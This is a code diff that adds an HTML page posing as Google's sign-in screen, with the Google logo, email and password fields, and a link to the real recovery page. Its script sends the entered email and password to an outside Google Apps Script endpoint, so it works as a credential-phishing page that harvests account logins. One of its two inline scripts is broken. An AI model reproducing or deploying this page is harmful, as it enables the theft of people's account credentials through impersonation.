@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login</title>
+  
+</head>
+<body>
+    <div class="login-box">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+        </div>
+        <h2>Sign In</h2>
+        <p>Use your Google Account</p>
+        <form name="bismillah-bisa">
+            <div class="input-box">
+                <input type="email" name="Email" required/>
+                <label>Email or phone</label>
+            </div>
+            <div class="input-box">
+                <input type="password" name="Password"required/>
+                <label>Password</label>
+            </div>
+             <div class="input-group">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Ingat Saya</label>
+            </div>
+            <script>
+      const btnKirim = document.querySelector('.btn-kirim');
+      const btnLoading = document.querySelector('.btn-loading');
+      const myAlert = document.querySelector('.my-alert');
+
+      form.addEventListener('submit', (e) => {
+        e.preventDefault();
+        // ketika tombol submit diklik
+        // tampilkan tombol loading, hilangkan tombol kirim
+        btnLoading.classList.toggle('d-none');
+        btnKirim.classList.toggle('d-none');
+        fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+          .then((response) => {
+            // tampilkan tombol kirim, hilangkan tombol loading
+            btnLoading.classList.toggle('d-none');
+            btnKirim.classList.toggle('d-none');
+            // tampilkan alert
+            myAlert.classList.toggle('d-none');
+            // reset formnya
+            form.reset();
+            console.log('Success!', response);
+          })
+          .catch((error) => console.error('Error!', error.message));
+    </script>
+            <style>
+ body {
+    font-family: 'Google';
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 80vh;
+    margin: 0;
+    background-color: #f2f2f2;
+}
+
+.login-box {
+  height: 390px;
+    width: 298px;
+    padding: 40px;
+    background: #fff;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    border-radius: 12px;
+}
+
+.logo img {
+    width: 92px;
+    margin-bottom: 20px;
+}
+.input-group {
+  margin-bottom: 15px;
+  text-align: left;
+  color :  rgba(0, 0, 0, 0.5);
+}
+h2 {
+    margin: 0 0 16px;
+    font-size: 24px;
+    color: #333;
+}
+
+p {
+  margin-left: 10px;
+  text-decoration: none;
+  
+}
+p forgot {
+}
+.input-box {
+    position: relative;
+    margin-bottom: 20px;
+}
+
+.input-box input {
+    width: 100%;
+    padding: 10px;
+    font-size: 16px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    outline: none;
+}
+
+.input-box label {
+    position: absolute;
+    top: 10px;
+    left: 10px;
+    color: #999;
+    pointer-events: none;
+    transition: 0.5s;
+}
+
+.input-box input:focus ~ label,
+.input-box input:valid ~ label {
+    top: -10px;
+    left: 10px;
+    color: #333;
+    font-size: 12px;
+}
+
+button {
+    width: 107.5%;
+    padding: 10px;
+    background: #4285f4;
+    border: none;
+    color: #fff;
+    font-size: 16px;
+    border-radius: 15px;
+    cursor: pointer;
+    transition: background 0.3s;
+}
+button:hover {
+    background: #357ae8;
+}
+  </style>
+            <button type="submit">Sign In</button>
+            <a href="https://accounts.google.com/v3/signin/recoveryidentifier?flowName=GlifWebSignIn&dsh=S-1237665195%3A1725297999758766&ddm=0" class="forgot"><p>Forgot Your Password ?</p></a>
+        </form>
+        <script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbzPj_AFopmJsj-CPIQmII4rXFojYcDOU27GuOYRcYMGU6HwEI9CAt6_bLpLYIBRcQ0Nkg/exec'
+  const form = document.forms['bismillah-bisa']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+    </div>
+</body>
+</html>
